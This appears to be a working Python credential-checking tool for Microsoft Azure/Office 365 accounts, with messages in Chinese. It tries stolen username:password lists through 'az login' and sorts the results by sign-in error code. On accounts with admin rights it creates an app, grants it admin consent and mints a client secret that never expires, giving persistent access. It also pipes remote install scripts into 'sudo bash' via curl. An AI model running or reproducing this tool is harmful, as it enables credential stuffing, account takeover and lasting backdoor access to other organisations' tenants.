# -*- coding: UTF-8 -*-
import os
import platform
import subprocess
import datetime
import numpy as np
import pandas as pd
import json
import jmespath
import time


######  acc  part
accs = np.array(pd.read_table("./acc.txt", dtype=str, sep=':', usecols=(0, 1), encoding='utf-8', skip_blank_lines=True, header=None))


def run():
    if test_azurecli() == 'true':
        print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 开始运行')
        for acc in accs:
            try:
                acc_status = get_status(acc)
                if acc_status == '密码正确':
                    # print(acc[0] + ':' + acc[1] + ' good')
                    good = acc[0] + ':' + acc[1]
                    with open('./good.txt', 'a', encoding='utf-8') as fa:
                        fa.write(good)
                        fa.write('\n')
                    if admin_check(acc) == 'admin':
                        print(acc[0] + ':' + acc[1] + ' admin')
                        admin = acc[0] + ':' + acc[1]
                        with open('./admin.txt', 'a', encoding='utf-8') as fa:
                            fa.write(admin)
                            fa.write('\n')
                        api = creat_api(acc)
                        print('尝试创建api')
                        with open('./api.txt', 'a', encoding='utf-8') as fa:
                            fa.write(str(acc))
                            fa.write('\n')
                            fa.write(api)
                            fa.write('\n')
                    else:
                        pass
                elif acc_status == '需要添加二验' or acc_status == '密码过期':
                    print(acc[0] + ':' + acc[1] + ' manual')
                    manual = acc[0] + ':' + acc[1]
                    with open('./manual.txt', 'a', encoding='utf-8') as fa:
                        fa.write(manual)
                        fa.write('\n')
                else:
                    print(acc[0] + ':' + acc[1] + ' ' + acc_status)
            except Exception as e:
                pass
        print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 完成运行')
    else:
        print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 运行结束')


def admin_check(acc):
    shell_check = 'az ad user create --display-name xxx --password SSaa1122 --user-principal-name xxx@xxx.xx --only-show-errors'
    admin_result = subprocess.getoutput(shell_check)
    if 'Insufficient privileges' in str(admin_result):
        return 'not_admin'
    elif 'domain names' in str(admin_result):
        return 'admin'
    else:
        return 'error'


def creat_api(acc):
    shell_create = 'az ad app create --display-name undead --required-resource-accesses @manifest.json --only-show-errors'
    create_result = subprocess.getoutput(shell_create)

    appid = jmespath.search('appId', json.loads(create_result))

    shell_admin = 'az ad app permission admin-consent --id ' + appid
    shell_credential = 'az ad app credential reset --only-show-errors --end-date 9999-12-31 --id ' + appid

    admin_try = 0
    while admin_try < 5:
        admin_result = subprocess.getoutput(shell_admin)
        if 'Bad Request' in str(admin_result):
            print('权限授予失败，重试中...')
            admin_try += 1
            time.sleep(2)
        else:
            print('权限授予完成')
            apis = subprocess.getoutput(shell_credential)
            print(str(apis))
            break
    else:
        print('可能是非全局管理或超时')
        apis = 'error'
    return str(apis)



def get_status(acc):
    if '@gmail.com' in acc[0]:
        return '不支持MSA账号'
    else:
        shell_content = 'az login --allow-no-subscriptions -u ' + acc[0] + ' -p=' + acc[1]
        try:
            status = subprocess.getoutput(shell_content)
            if 'true' in str(status):
                return '密码正确'
            elif '50034' in str(status):
                return '账户不存在'
            elif '50126' in str(status):
                return '密码错误'
            elif '53003' in str(status):
                return 'IP限制'
            elif '50057' in str(status):
                return '管理ban'
            elif '50059' in str(status):
                return '被删号'
            elif '50053' in str(status):
                return '被暴力破解，自动ban'
            elif '90019' in str(status):
                return '账号错误'
            elif '50055' in str(status):
                return '密码过期'
            elif '53004' in str(status):
                return '异常活动，且二验'
            elif '50076' in str(status):
                return '需要二验'
            elif '50079' in str(status):
                return '需要添加二验'
            else:
                print(status)
                return '未知错误'
        except Exception as e:
            return '未知错误'


def test_azurecli():
    try:
        az_ver = subprocess.check_output('az -v', shell=True)
    except Exception as e:
        az_ver = '0'

    if 'core' in str(az_ver):
        print('azure-cli环境正常')
        return 'true'
    else:
        print('azure-cli未安装，尝试自动安装...')
        sys_ver = str(platform.uname())
        if 'Debian' in sys_ver or 'Ubuntu' in sys_ver:
            os.system('curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash')
        elif 'Centos' in sys_ver or 'Redhat' in sys_ver or 'Fedora' in str(sys_ver):
            print('此系统下安装azure-cli包很大，建议换成Ubuntu，但依然尝试安装')
            os.system('curl -sL https://raw.githubusercontent.com/xcgx/office365-cli/main/azure-cli-install-CentOS1.sh | sudo bash')
        else:
            print('系统为Windows或其他系统，请手动安装https://docs.azure.cn/zh-cn/cli/install-azure-cli-windows?view=azure-cli-latest&tabs=azure-cli')
            return 'false'
    try:
        az_ver = subprocess.check_output('az -v', shell=True)
    except Exception as e:
        az_ver = '0'

    if 'core' in str(az_ver):
        print('当前azure-cli环境正常，将继续运行')
        return 'true'
    else:
        print('azure-cli自动安装失败，请手动安装')


run()
